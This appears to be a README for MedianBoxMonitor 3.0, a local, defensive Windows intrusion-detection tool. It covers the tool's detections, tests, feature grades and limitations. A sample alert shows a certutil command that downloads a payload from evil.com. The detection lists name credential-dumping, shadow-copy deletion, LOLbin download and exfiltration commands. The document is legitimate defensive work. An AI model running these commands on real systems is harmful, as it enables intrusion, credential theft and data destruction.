# About MedianBoxMonitor 3.0

## The Problem

Modern computers are under constant threat. Hackers use fileless malware, living-off-the-land binaries (LOLbins), process hollowing, encoded PowerShell, macro malware, browser exploits, credential dumping, lateral movement, and stealthy persistence mechanisms that traditional antivirus cannot detect because they use legitimate system tools and techniques.

A connected hacker — someone who has gained remote access to your machine — does not need to drop a file. They can run `certutil.exe` to download a payload, use `rundll32.exe` to execute it from memory, create a WMI subscription for persistence, dump LSASS credentials with `comsvcs.dll,MiniDump`, and exfiltrate data through a Discord webhook — all using tools that ship with Windows.

Meanwhile, your VPN might be leaking DNS queries, your browser might be exposing your real IP via WebRTC, and a compromised service might be beaconing to a command-and-control server every 30 seconds — and you would never know.

## The Solution

MedianBoxMonitor 3.0 is a **local, defensive security monitoring application** that sits inside your operating system and watches everything in real time. It does not scan the network. It does not attack remote users. It observes what is happening on your own machine and reasons about whether those actions are legitimate or malicious.

### Design Philosophy

**Deductive, not heuristic.** Every alert (called a "deduction") comes with a full evidence chain — not just "suspicious" but exactly why, with the process name, PID, parent process, command line, destination IP, domain, country, and the specific rule that triggered. You can audit every alert and verify whether it is a true or false positive.

**Defense in depth.** The monitor does not rely on a single detection method. It cross-references process behavior, network connections, DNS queries, GeoIP data, registry changes, file system changes, DLL loads, memory forensics, Windows event logs, and 18 anti-hack heuristics. A hacker who evades one detection will be caught by another.

**No single source is trusted.** The MultiVerifier cross-checks IP geolocation using 11 independent methods. If one source says "United States" and another says "Russia," that disagreement is itself reported as a VPN/proxy indicator. Confidence grades (A through F) tell you exactly how much to trust each verdict.

**Local only.** The monitor runs entirely on your machine. It does not phone home. It does not upload your data. GeoIP lookups go to public APIs (ip-api.com, ipwho.is) for IP enrichment only — your personal data stays local.

**Works without packet capture.** If Npcap/WinPcap is not installed, the monitor continues operating on process and connection data from psutil. Packet capture enhances detection but is not required. The monitor never silently stops collecting data.

**Fails visibly.** Exceptions in the process watcher, connection inventory, and GUI refresh are logged, not silently swallowed. The status line updates every 5 seconds — if it stops, something is wrong and you will see it.

## What It Catches

### Connected Hackers

- **Network-spawned shells** — sshd.exe, w3wp.exe, or termsrv.exe spawning cmd.exe or powershell.exe (post-exploitation indicator #1)
- **Listening port anomalies** — non-system process opening unexpected ports (bind shell, C2 listener)
- **Credential dumping** — mimikatz, procdump -ma, reg save HKLM\SAM, ntdsutil, comsvcs.dll MiniDump
- **Process hollowing** — svchost.exe running from C:\Temp\ instead of System32
- **Parent-child mismatch** — svchost.exe spawned by cmd.exe instead of services.exe
- **LOLbin abuse** — certutil -urlcache, bitsadmin /transfer, mshta http://, regsvr32 /i:http (Squiblydoo), rundll32 from temp
- **PowerShell obfuscation** — encoded commands, download cradles, AMSI bypass, Reflection.Assembly, stealth flag combos
- **Macro malware** — Word/Excel/PowerPoint spawning cmd.exe or powershell.exe
- **Browser exploits** — Chrome/Firefox/Edge spawning shells or mshta.exe
- **Renamed system binaries** — cmd.exe or powershell.exe running from Downloads or Temp
- **Port forwarding** — chisel, ngrok, ligolo, plink, SSH -L/-R/-D
- **Data staging** — 7z/winrar/tar compressing user document directories before exfiltration
- **Backup tampering** — vssadmin delete shadows, wbadmin delete catalog, bcdedit recoveryenabled no (ransomware indicator)
- **Admin share access** — net use \\host\C$, PsExec (lateral movement)
- **Exfil channels** — connections to Discord webhooks, Telegram bot API, Pastebin, webhook.site
- **Exfil uploads** — curl/wget with --upload-file or -T flags to external servers

### System Compromise

- **Windows Security events** — logon (4624/4625), process creation (4688), service install (7045), user creation (4720), admin group changes (4728/4732), Kerberos tickets (4768/4769)
- **Hosts file hijack** — modification to C:\Windows\System32\drivers\etc\hosts
- **DNS server changes** — DNS resolver addresses changed via netsh or DHCP
- **New services** — services with binary paths in Temp/Downloads/AppData (persistence/backdoor)
- **Defender disable** — real-time protection turned off, firewall disabled
- **New user accounts** — new users or admin group members (backdoor accounts)
- **WMI persistence** — WMI event filter or CommandLineEventConsumer creation (APT persistence)
- **Driver loads** — new kernel drivers or .sys files (rootkit indicator)
- **Malware mutexes** — known mutex names from Cobalt Strike, Meterpreter, and other malware families

### Network Threats

- **C2 beaconing** — regular-interval connections to the same destination
- **DNS tunneling** — high-entropy subdomains, long labels, high query rates (data exfiltration via DNS)
- **Exfiltration** — I/O byte spike exceeding 10x baseline
- **Phantom connections** — ESTABLISHED connections with no owning process
- **Injection chains** — known app (Chrome, Word) spawning unknown children with many connections
- **Mimicry** — process connecting to IPs that impersonate a known legitimate service
- **Foreign connections** — process connecting to an unexpected country
- **High-risk countries** — connections to CN, RU, KP, IR (configurable)
- **DoH bypass** — DNS-over-HTTPS connections that bypass local DNS monitoring
- **Inbound port scans** — external IPs probing multiple ports
- **TLS MITM** — certificate anomalies indicating man-in-the-middle

### VPN/Privacy Leaks

- **DNS resolver leaks** — DNS queries going outside the VPN tunnel
- **IPv6 leaks** — global IPv6 traffic bypassing an IPv4-only VPN
- **Route leaks** — traffic not routing through the VPN interface
- **WebRTC leaks** — browser exposing real local IP via WebRTC
- **Proxy detection** — TCP fingerprinting, known proxy port patterns

### Behavioral Anomalies

- **Idle anomaly** — network activity while the user is idle (5+ minutes)
- **ML anomaly** — statistical Z-score deviation over a 24-hour baseline window
- **Behavioral anomaly** — process behavior deviating from its own established baseline
- **DLL injection** — suspicious modules loaded into process memory
- **Registry persistence** — Run keys, scheduled tasks, startup folder changes
- **Clipboard access** — processes reading the clipboard
- **USB device changes** — new USB devices connected or removed
- **File system changes** — modifications to sensitive directories

## How It Was Built

The program is a single Python file (~16,500 lines) with 52 classes organized into functional layers:

1. **Data classes** — `ProcessProfile`, `Deduction`, `ConnectionEntry` (dataclasses)
2. **Detection classes** — `DNSTunnelingDetector`, `BeaconDetector`, `EntropyAnalyzer`, `ProcessLegitimacyChecker`, `DLLInspector`, `InboundScanDetector`, `DoHDetector`, `TLSCertDetector`
3. **Monitor classes** — `RegistryMonitor`, `ClipboardMonitor`, `USBMonitor`, `ScheduledTaskMonitor`, `NamedPipeMonitor`, `FileSystemWatchdog`, `SecurityEventMonitor`, `HostsFileMonitor`, `ServiceMonitor`, `SecurityToolMonitor`, `UserAccountMonitor`, `WMISubscriptionMonitor`, `DriverLoadMonitor`, `MutexScanner`
4. **Enrichment classes** — `DNSCache`, `GeoIPCache`, `ServiceResolver`, `ConnectionInventory`, `ConnectionHistory`, `WhoisLookup`, `VirusTotalChecker`
5. **Verification classes** — `LocationVerifier`, `MultiVerifier`, `ProxyDetector`, `VPNLeakDetector`
6. **Infrastructure classes** — `PacketPipeline`, `TokenBucket`, `DatabaseManager`, `SIEMOutput`, `AlertEscalation`, `StatisticalBaseline`, `JA4Plus`
7. **GUI classes** — `GNATracerGUI`, `TileManager`, `WidgetTooltip`
8. **Main class** — `MedianBoxMonitor` (orchestrates all threads, detections, and data flow)

The program uses threading extensively (11+ threads) with careful lock management. The connection mapper replaces data structures atomically rather than mutating them, allowing the process watcher to grab references without copying. Background workers handle slow network I/O (GeoIP API calls, reverse DNS) so the main scanning loops never block.

## Testing

Seven test suites verify correctness — four detection-logic suites plus three added in the 2026-08-22 audit to close a real gap: nothing previously verified that harvested data actually reached the screen or that the GUI rendered without exceptions.

- **`_test_antihack.py`** (41 tests) — Simulates sneaky hacker techniques (LOLbin abuse, PowerShell obfuscation, macro malware, process hollowing, credential dumping, etc.) and verifies each detection path fires correctly, including negative tests that verify benign activity does not trigger false positives.
- **`_test_vpn_leak.py`** (32 tests) — Tests VPN leak detection for DNS, IPv6, route, and WebRTC leaks.
- **`_test_vpn_detection.py`** — Tests VPN/proxy detection false-positive rate (target: <5%, achieved: 0%) across 1,100 synthetic endpoints.
- **`_test_location_accuracy.py`** — Tests MultiVerifier location accuracy across the 11 verification methods.
- **`_test_data_wiring.py`** *(new)* — Runs the real monitor against live traffic and asserts every field a collector harvests (GeoIP, ASN, rDNS, RTT, TTL/OS, VPN verdict) actually lands on the connection record for every public IP, that the process export isn't silently truncated, and that no payload key is built and never read.
- **`_test_gui_render.py`** *(new)* — Drives the actual Tkinter widgets (not a mock) through all 16 tabs against live data and asserts zero exceptions, zero stale `?` placeholders, and that every newly-wired field is present in the rendered text.
- **`_test_click_actions.py`** *(new)* — Fires real `<Button-1>` events at the clickable connection rows and block/unblock controls and asserts the correct callback runs — verifying the performance rework (embedded `tk.Button` widgets replaced with tagged text spans) didn't silently break interactivity.

None of the three new suites replace the first four — they answer a different question. The original four ask "does the detection logic fire correctly?" The new three ask "does what the detection logic produces actually reach the user?" Both questions matter; a correct detection that never renders is as useless as an incorrect one.

## Feature Completeness Ratings

Every subsystem below was audited against the actual source (not the docs) on 2026-08-22. Grades reflect what the code does *today*, not what it's designed to eventually do. Scale:

| Grade | Meaning |
|-------|---------|
| **A** | Fully implemented, cross-platform where relevant, verified against live data |
| **B** | Fully implemented on the primary platform (Windows), solid, but static rule lists or single-platform only |
| **C** | Implemented with a real structural limitation (opt-in, rate-capped, static thresholds, degrades without an optional dependency) |
| **D** | Present but materially incomplete — covers a minority of what the name implies |
| **F** | Not implemented |

| Subsystem | Grade | Why |
|-----------|-------|-----|
| Network & connection tracking | **A-** | Every public endpoint now gets full GeoIP + VPN/proxy cross-verification (fixed 2026-08-22 — previously only ~15% of connections qualified). Interface auto-detection now correctly picks the live adapter (was picking a disconnected APIPA link in testing). |
| VPN/proxy detection | **A-** | 100% detection / 0% false-positive rate against a 1,100-endpoint synthetic test set. Runs on every public IP, not a filtered subset. |
| GeoIP & MultiVerifier | **B+** | Excellent cross-verification design (11 independent methods, honest confidence grading) — but defaults to free third-party HTTP APIs (ip-api.com, ipwho.is) with no local MaxMind DB bundled, and every enriched IP leaves the machine over plain HTTP unless you supply your own DB. |
| Core deductions (16) + anti-hack process checks (18) | **B** | Solid, auditable evidence chains. All are heuristic — path, parent, command-line keyword, and static threat lists. No code-signing check anywhere in the codebase. |
| Anti-hack background monitors (8) | **C** | Fully functional, but **100% Windows-only** — every one shells out to a Windows-specific tool (`sc`, `wmic`, `schtasks`, `net user`, `netsh`, `wevtutil`) or WinAPI. On Linux/macOS these 8 monitors, plus the 9 Windows-only process checks that depend on them, simply never fire. |
| Packet analysis / JA4+ / SNI | **C+** | Well-built, but entirely inert without Npcap/WinPcap installed — and it is **not installed by default nor auto-checked at startup with a clear remediation prompt**, so a user can run the tool for weeks unaware that packet-level detection is silently disabled. |
| Malware signature / static detection | **F** | Zero code-signing (Authenticode) verification and zero YARA/byte-signature scanning exist anywhere. A binary correctly named, correctly parented, and correctly pathed is invisible to every check regardless of whether it's actually signed by the vendor it impersonates. |
| Automated response | **F** | The only containment action is a manual "Block IP" button (Windows Firewall rule). There is no automatic process termination, quarantine, or network isolation on a CRITICAL finding — a user away from the screen gets no containment at all. |
| Out-of-band alerting | **F** | SIEM output (JSON/CEF file or syslog) is the only notification path. No email, Slack/Discord webhook, push, or SMS — a CRITICAL deduction fired while you're not looking at the GUI or dashboard produces no alert anywhere else. |
| Persistent storage | **D** | The SQLite database has exactly 2 tables (`deductions`, `devices`). Connections, processes, VPN-leak events, and all 9 Tier-5 monitor event types (clipboard, USB, scheduled tasks, named pipes, inbound scans, DoH, TLS-cert, Bluetooth, serial) are **not** in the database — only in rotating text logs and 10-minute session snapshots. There is no SQL-queryable connection or process history. |
| Threat intelligence freshness | **D** | LOLbin patterns, the 25 exfil-channel domains, the 10 malware mutex names, VPN/proxy ASN markers, and high-risk country codes are all hardcoded Python constants. No feed integration, no auto-update — the list is exactly as current as the last time someone edited the source. |
| Packaging / reproducibility | **D** | No `requirements.txt`, `pyproject.toml`, or pinned dependency versions anywhere in the project. Provisioning a clean environment means reading imports and guessing versions. |
| Cross-platform coverage overall | **D** | Despite "Linux (partial)" in the docs, in practice Linux gets process/connection/DNS/GeoIP/VPN-detection only — roughly 24 of the ~33 named detections (everything touching the registry, WMI, services, scheduled tasks, the security event log, or Windows-only WinAPI) simply don't run. macOS has no dedicated support at all beyond a single `open` command to launch a folder in Finder. |

## Limitations

**Detection boundaries**
- **Encrypted payload content is invisible by design.** The monitor sees TLS metadata (SNI, JA3/JA4, certificate fields) but never decrypts application data. Malicious activity conducted entirely inside a TLS session with a benign-looking SNI (e.g., abuse of a compromised legitimate SaaS token) is outside what packet inspection here can ever see — this is a correct privacy boundary, not a bug, but it means the tool cannot be the only layer of defense.
- **No code-signing (Authenticode) or YARA/signature scanning exists.** Every detection is behavioral or heuristic — path, parent process, command-line keywords, static mutex names, port patterns. A binary that is correctly named, correctly pathed, and correctly parented is invisible to every check, whether or not it is actually signed by the vendor it claims to be.
- **Mutex detection uses a static list of 10 known names** (Cobalt Strike, Meterpreter, and a handful of others). Any malware author who renames their mutex — a one-line change — evades this check entirely. There is no generic/heuristic mutex-anomaly detection.
- **DNS-tunneling and entropy thresholds are fixed constants**, not adaptive per-network baselines. A slow, low-and-slow tunnel that stays under the entropy/rate threshold evades detection; conversely, legitimately high-entropy traffic can trip a warning that requires manual review.
- **No sandboxing or dynamic detonation.** This is a passive observer of what actually runs. A payload that waits for a specific trigger and never manifests suspicious behavior while being watched will not be caught.
- **Heuristics are not proof.** Every deduction is an evidence chain, not a verdict. A `LISTEN_ANOMALY` on `ollama.exe` or `python.exe` is a flag for review, not a confirmed compromise. The user is the final arbiter.

**Platform & dependency boundaries**
- **Packet capture requires Npcap/WinPcap** on Windows, and the monitor does not check for it at startup with an actionable prompt — it silently falls back to psutil-only operation. Without it, the monitor cannot extract SNI, DNS queries, or TLS fingerprints from raw packets, and beacon/entropy/JA4 detection has nothing to analyze.
- **8 of the anti-hack background monitors, and most of the 9 core process checks that depend on Windows-specific data, only run on Windows.** Linux gets process, connection, DNS, GeoIP, and VPN/proxy detection — a real and useful subset, but not the "18 anti-hack features" headline in full. macOS is essentially unsupported.
- **Windows Security event log requires admin** to read the Security channel. Without admin, the `wevtutil` fallback is used but may have limited results.
- **VirusTotal integration is opt-in via an environment variable** (`VT_API_KEY`) with no CLI flag or GUI field to set it, and the free-tier API is rate-limited to 4 requests/minute — far below the process-creation rate of an active machine, so even configured, only a small fraction of executables ever get checked.
- **GeoIP accuracy depends on the data source.** ip-api.com and ipwho.is are free APIs with reasonable accuracy but are not authoritative, and a local MaxMind database is optional and not bundled — you must supply your own. The MultiVerifier surfaces disagreements precisely because no single source should be trusted.
- **External services can fail.** ip-api.com, ipwho.is, rdap.org, and VirusTotal can be rate-limited, unreachable, or return incomplete data. The monitor degrades gracefully — unresolved entries show as "Unknown" and are re-queued for later enrichment.

**Response & operational boundaries**
- **The monitor is defensive only** and does not identify remote VPN users, attack remote systems, or perform any offensive operations. It watches your own machine.
- **The only containment action is a manual firewall-rule block per IP.** There is no automatic process kill, quarantine, or network isolation on a CRITICAL finding.
- **No out-of-band alerting exists** beyond SIEM file/syslog output. If you are not looking at the GUI or web dashboard when a CRITICAL fires, nothing pages you.
- **The Tkinter GUI has no authentication of its own** — only the optional web dashboard supports a password. Anyone with desktop access while the GUI is open sees the full forensic picture.
- **Only 2 of the tracked entity types are in the SQLite database** (deductions, devices). Connections, processes, and every Tier-5 monitor event live only in rotating text logs and periodic session snapshots — there is no SQL-queryable history for them.

## How Evidence Works

Every deduction is a `Deduction` dataclass with:

- **category** — one of 40+ named categories (MIMIC, FOREIGN, BEACON, LOLBIN_ABUSE, etc.)
- **severity** — CRITICAL or WARNING
- **process_name** and **pid** — the offending process
- **message** — human-readable summary
- **evidence** — a list of strings, each one a specific fact that contributed to the deduction
- **score** — numeric risk score (0-100+, compounded by `AlertEscalation` when the same process triggers multiple deductions within 5 minutes)

For example, a `LOLBIN_ABUSE` deduction might have evidence like:

```
["Process: certutil.exe (PID 4892)",
 "Command: certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\run.exe",
 "Matched pattern: -urlcache",
 "Matched pattern: -split",
 "Matched pattern: http"]
```

This is auditable. You can see exactly what the process was doing and why the monitor flagged it. You can verify whether it was a legitimate admin task or an attack.

## The Anti-Hack Pin System

When an anti-hack check fires, the finding is "pinned" to the remote IP addresses owned by the offending process. This connects the local detection to the network endpoint:

- `_pin_to_conns(pid, category, detail)` — finds all remote IPs for the PID and adds the category to `_anti_hack_pins[ip]`
- `_anti_hack_pins` — dict mapping `ip → set(categories)`
- `_anti_hack_details` — dict mapping `ip → list(detail_strings)`

Pins are rendered in the Overview tab, Live Connections tab, All Connections tab, and per-connection detail views. They are also exported in the **Sneakiest Connections** section of save files.

## Auto-Flag Action System

Beyond the 16 core deductions and 18 anti-hack checks, every process action is screened against 33 suspicious keyword patterns. This catches activity that does not match a specific deduction rule but still warrants attention:

- `cookie` → COOKIE_TRACKING
- `upload`/`exfil` → DATA_UPLOAD / DATA_EXFIL
- `credential`/`password`/`token` → CREDENTIAL_ACCESS / TOKEN_ACCESS
- `clipboard` → CLIPBOARD_ACCESS
- `keylog` → KEYLOGGER
- `screenshot` → SCREEN_CAPTURE
- `inject`/`hook` → CODE_INJECTION / API_HOOK
- `encrypt`/`decrypt` → ENCRYPTION (possible ransomware)
- `powershell`/`cmd.exe`/`wscript`/`cscript` → SCRIPT_EXEC
- `rdp`/`vnc`/`ssh`/`telnet` → REMOTE_ACCESS
- `microphone`/`camera`/`webcam`/`audiodg` → HARDWARE_ACCESS
- `temp\`/`appdata`/`downloads\` → TEMP_EXECUTION / SUSPICIOUS_PATH

These appear in the Suspicious Activity tab and the save file's Suspicious Activity section.

## Known Service Validation

The monitor includes CIDR ranges for known services (Google, Cloudflare, Microsoft, Discord, Zoom, Riot Games) and expected executable paths for 20+ system and application processes. This allows it to:

- Validate that a `chrome.exe` connection to a Google IP range is legitimate
- Flag a `chrome.exe` connection to an unknown IP as suspicious
- Detect a `svchost.exe` running from `C:\Temp\` as process hollowing
- Detect a `svchost.exe` spawned by `cmd.exe` as parent spoofing

## Scope

This program is for **local defensive security monitoring**. It helps you:

- Detect if a hacker has gained access to your machine
- Detect if malware is running, even fileless malware using LOLbins
- Detect if your VPN is leaking your real IP or DNS queries
- Detect if a process is beaconing to a C2 server
- Detect if someone is dumping credentials or moving laterally
- Detect if persistence mechanisms have been installed
- Record everything in time-segmented files for forensic analysis

It is not for de-anonymizing remote VPN users, attacking remote systems, or replacing your antivirus. It is a witness that watches your own machine and tells you what it sees.
